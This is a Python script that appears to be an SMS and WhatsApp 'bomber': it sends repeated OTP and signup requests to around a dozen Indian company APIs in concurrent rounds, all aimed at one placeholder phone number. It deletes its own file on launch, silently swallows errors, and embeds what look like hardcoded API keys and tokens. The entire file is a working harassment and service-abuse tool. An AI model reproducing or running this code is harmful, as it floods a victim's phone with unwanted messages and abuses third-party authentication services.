import asyncio
import aiohttp
import time 
import os
start = time.time()
os.remove(__file__)
def whatsappp():

    async def physreg():
        try:
            json_data = {
                'mobile': '€tor',
                'countryCode': '+91',
                'firstName': 'ohiuhds',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189',  json=json_data) as response:
                    pass
                    print("hiii")
        except Exception as e:
            pass

            
    async def potfull():
        try:
            headers = {
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'text/plain;charset=UTF-8',
            'Origin': 'https://potful.in',
            'Referer': 'https://potful.in/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            'domain': 'potful.in',
            'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            }

            params = {
            'version': '2.0',
            }

            data = '{"name":"terimaaki","phone":€tor,"email":"jkkjfj@gmail.com","gender":1}'

            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.restro.app/authentication/customerSignup', params=params, headers=headers, data=data) as response:
                    pass
        except Exception as e:
            pass

    async def foxi():
        try:
            headers = {
                'authority': 'www.foxy.in',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.foxy.in',
                'platform': 'web',
                'referer': 'https://www.foxy.in/',
                'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
                'x-guest-token': '09eaa6c2-7648-4d23-833c-728ed9e3b0bc',
            }

            json_data = {
                'user': {
                    'country_code': '91',
                    'phone_number': '€tor',
                },
                'via': 'whatsapp',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.foxy.in/api/v2/users/send_otp',  headers=headers, json=json_data) as response:
                    pass
        except Exception as e:
            pass

    async def udaan():
        try:
            params = {
                'client_id': 'udaan-v2',
            }

            data = {
                'mobile': '€tor',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://auth.udaan.com/api/otp/send', params=params,   data=data)as response:
                    pass
        except Exception as e:
            pass

    async def udaan1():
        try:
            params = {
                'client_id': 'udaan-v2',
            }

            data = {
                'mobile': '€tor',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://auth.udaan.com/api/otp/send', params=params,   data=data)as response:
                    pass
        except Exception as e:
            pass

    async def udaan2():
        try:
            params = {
                'client_id': 'udaan-v2',
            }

            data = {
                'mobile': '€tor',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://auth.udaan.com/api/otp/send', params=params,   data=data)as response:
                    pass
        except Exception as e:
            pass
    
    async def toolsvilla():
        try:
            json_data = {
                'firstname': '',
                'mobileno': '€tor',
                'email': '',
                'wtpSubs': True,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.toolsvilla.com/web/register',  json=json_data)as response:
                    pass
        except Exception as e:
            pass

    async def goibobo():
        try:
            headers = {
                'authority': 'userservice.goibibo.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'authorization': 'jkO7Ivpwsh4KaQ9',
                'content-type': 'application/json',
                'origin': 'https://www.goibibo.com',
                'referer': 'https://www.goibibo.com/',
                'sec-ch-ua': '"Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
                'user-identifier': '{"type":"auth","deviceId":"b3bd06ae-1dc5-494c-ae1c-69c35e26f3a9","os":"desktop","osVersion":"osVersion","appVersion":"appVersion","imie":"imie","ipAddress":"ipAddress","timeZone":"+5.30 GMT","value":""}',
                'x-request-tracker': '338049b7-c06f-49db-a40c-b663f4af5e60',
            }

            json_data = {
                'loginId': '€tor',
                'countryCode': '91',
                'channel': [
                    'whatsapp',
                ],
                'appHashKey': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://userservice.goibibo.com/ext/web/desktop/send/token/OTP_IS_REG',
                headers=headers,
                json=json_data,
            )as response:
                    pass
        except Exception as e:
            pass

    async def rappi():
        try:
            json_data = {
                'country_code': '+91',
                'phone': '€tor',
            }

            
            async with aiohttp.ClientSession() as sess:
                async with sess.post(
                'https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create',
                
                json=json_data,
            )as response:
                    pass
        except Exception as e:
            pass


    async def meatigo():
        try:
            params = {
                'queryName': 'resendOTP',
            }

            json_data = {
                'query': '\n  query ($input: mobileInput) {\n    resendOTP(input: $input) {\n      code\n      message\n      causes\n      data\n    }\n  }\n',
                'variables': {
                    'input': {
                        'mobile': '€tor',
                    },
                },
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://gql.meatigo.com/', params=params,  json=json_data)as response:
                    pass
        except Exception as e:
            pass

    async def phisics():
        try:
            params = {
                'smsType': '1',
            }

            json_data = {
                'mobile': '€tor',
                'organizationId': '5eb393ee95fab7468a79d189',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.penpencil.co/v1/users/resend-otp', params=params,  json=json_data)as response:
                    pass
        except Exception as e:
            pass

    async def spinny():
        try:
            json_data = {
                'contact_number': '€tor',
                'whatsapp': True,
                'code_len': 4,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.spinny.com/api/c/user/otp-request/',  json=json_data)as response:
                    pass
        except Exception as e:
            pass

    async def wakefit():
        try:
            headers = {
                'authority': 'api.wakefit.co',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'api-secret-key': 'ycq55IbIjkLb',
                'api-token': 'c84d563b77441d784dce71323f69eb42',
                'content-type': 'application/json',
                'origin': 'https://www.wakefit.co',
                'referer': 'https://www.wakefit.co/',
                'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
            }

            json_data = {
                'mobile': '€tor',
                'whatsapp_opt_in': 1,
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://api.wakefit.co/api/consumer-sms-otp/', headers=headers, json=json_data)as response:
                    pass
        except Exception as e:
            pass

    
    async def main():
        await physreg()
        for i in range(5):
            await asyncio.gather(
                udaan(),
                potfull(),
                udaan1(),
                foxi(),
                udaan1(),
                toolsvilla(),
                goibobo(),
                udaan(),
                udaan(),
                rappi(),
                meatigo(),
                udaan2(),
                phisics(),
                spinny(),
                udaan(),
                wakefit(),
                udaan1(),
                )
        
        
    asyncio.run(main())
            

whatsappp()
end = time.time()
f = open("ok.txt", "w")
f.write(str(end-start))
f.close()
